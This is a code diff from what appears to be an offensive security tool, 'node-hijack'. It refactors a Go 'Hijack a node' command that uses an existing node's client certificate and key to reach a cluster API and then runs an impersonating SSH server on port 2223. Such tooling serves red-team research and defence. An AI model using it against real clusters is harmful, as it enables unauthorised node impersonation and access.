@@ -10,21 +10,16 @@ import (
 	"golang.org/x/crypto/ssh/terminal"
 	api "xpnsec.com/node-hijack/v2/pkg/api"
 	sshserver "xpnsec.com/node-hijack/v2/pkg/ssh"
+	"xpnsec.com/shared/v2/pkg/connection"
 )
 
-var outputDir string
-var username string
-var hostname string
-var clientCertPath string
-var clientKeyPath string
-var proxy string
-
-var clientCert string
-var clientKey string
 var nodeId string
 var clientSSHCert string
 var ctx context.Context
 var cancel context.CancelFunc
+var connectionOptions connection.Options
+var hostSSHCert string
+var hostSSHKey string
 
 func sleep(ctx context.Context, duration time.Duration) error {
 	timer := time.NewTimer(duration)
@@ -43,7 +38,7 @@ var HijackCmd = &cobra.Command{
 	Short: "Hijack a node",
 	Long:  ``,
 	Run: func(cmd *cobra.Command, args []string) {
-		client, err := api.NewClient(clientCert, clientKey, "10.1.10.1:8443")
+		client, err := api.NewClient(connectionOptions.ClientCert, connectionOptions.ClientKey, connectionOptions.Proxy, connectionOptions.ClusterName)
 		if err != nil {
 			panic(err)
 		}
@@ -85,7 +80,7 @@ var HijackCmd = &cobra.Command{
 		}(ctx)
 
 		go func(ctx context.Context) {
-			server := sshserver.NewSSHServer("/tmp/hijack-certs/host_ssh_signed.crt", "/tmp/hijack-certs/host.key")
+			server := sshserver.NewSSHServer(hostSSHCert, hostSSHKey)
 			fmt.Printf("[*] SSH Server Started on port 2223\n")
 			err := server.Start(func(s gssh.Session) {
 
@@ -124,8 +119,20 @@ var HijackCmd = &cobra.Command{
 func init() {
 	ctx, cancel = context.WithCancel(context.Background())
 
-	HijackCmd.Flags().StringVarP(&clientCert, "client-cert", "c", "", "Existing Node Cert")
-	HijackCmd.Flags().StringVarP(&clientKey, "client-key", "k", "", "Existing Node Key")
 	HijackCmd.Flags().StringVarP(&clientSSHCert, "client-ssh-cert", "s", "", "Existing SSH Cert")
 	HijackCmd.Flags().StringVarP(&nodeId, "node-id", "n", "", "Node ID")
+	HijackCmd.Flags().StringVarP(&hostSSHCert, "host-ssh-cert", "", "", "Host SSH Cert")
+	HijackCmd.Flags().StringVarP(&hostSSHKey, "host-ssh-key", "", "", "Host SSH Key")
+
+	connectionOptions.AddProxyFlag(HijackCmd.Flags())
+	connectionOptions.AddClientCredentialFlags(HijackCmd.Flags())
+	connectionOptions.AddClusterNameFlag(HijackCmd.Flags())
+	HijackCmd.MarkFlagRequired("node-id")
+	HijackCmd.MarkFlagRequired("client-ssh-cert")
+	HijackCmd.MarkFlagRequired("proxy")
+	HijackCmd.MarkFlagRequired("client-cert")
+	HijackCmd.MarkFlagRequired("client-key")
+	HijackCmd.MarkFlagRequired("cluster-name")
+	HijackCmd.MarkFlagRequired("host-ssh-cert")
+	HijackCmd.MarkFlagRequired("host-ssh-key")
 }
